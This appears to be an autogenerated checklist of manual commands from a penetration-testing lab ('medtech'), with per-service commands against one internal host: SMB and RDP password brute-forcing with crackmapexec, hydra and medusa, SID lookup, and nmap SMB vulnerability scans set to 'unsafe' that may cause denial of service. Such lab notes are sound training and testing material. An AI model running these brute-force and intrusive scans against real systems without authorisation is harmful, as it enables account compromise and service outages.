```bash
[*] msrpc on tcp/135

	[-] RPC Client:

		rpcclient -p 135 -U "" 172.16.185.82

[*] netbios-ssn on tcp/139

	[-] Bruteforce SMB

		crackmapexec smb 172.16.185.82 --port=139 -u "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -p "/usr/share/seclists/Passwords/darkweb2017-top100.txt"

	[-] Nmap scans for SMB vulnerabilities that could potentially cause a DoS if scanned (according to Nmap). Be careful:

		nmap -vv --reason -Pn -T4 -sV -p 139 --script="smb-vuln-* and dos" --script-args="unsafe=1" -oN "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.82/scans/tcp139/tcp_139_smb_vulnerabilities.txt" -oX "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.82/scans/tcp139/xml/tcp_139_smb_vulnerabilities.xml" 172.16.185.82

[*] microsoft-ds on tcp/445

	[-] Bruteforce SMB

		crackmapexec smb 172.16.185.82 --port=445 -u "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -p "/usr/share/seclists/Passwords/darkweb2017-top100.txt"

	[-] Lookup SIDs

		impacket-lookupsid '[username]:[password]@172.16.185.82'

	[-] Nmap scans for SMB vulnerabilities that could potentially cause a DoS if scanned (according to Nmap). Be careful:

		nmap -vv --reason -Pn -T4 -sV -p 445 --script="smb-vuln-* and dos" --script-args="unsafe=1" -oN "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.82/scans/tcp445/tcp_445_smb_vulnerabilities.txt" -oX "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.82/scans/tcp445/xml/tcp_445_smb_vulnerabilities.xml" 172.16.185.82

[*] ms-wbt-server on tcp/3389

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 3389 -o "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.82/scans/tcp3389/tcp_3389_rdp_hydra.txt" rdp://172.16.185.82

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 3389 -O "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.82/scans/tcp3389/tcp_3389_rdp_medusa.txt" -M rdp -h 172.16.185.82

[*] netbios-ns on udp/137

	[-] Bruteforce SMB

		crackmapexec smb 172.16.185.82 --port=137 -u "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -p "/usr/share/seclists/Passwords/darkweb2017-top100.txt"

	[-] Nmap scans for SMB vulnerabilities that could potentially cause a DoS if scanned (according to Nmap). Be careful:

		nmap -vv --reason -Pn -T4 -sU -sV -p 137 --script="smb-vuln-* and dos" --script-args="unsafe=1" -oN "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.82/scans/udp137/udp_137_smb_vulnerabilities.txt" -oX "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.82/scans/udp137/xml/udp_137_smb_vulnerabilities.xml" 172.16.185.82


```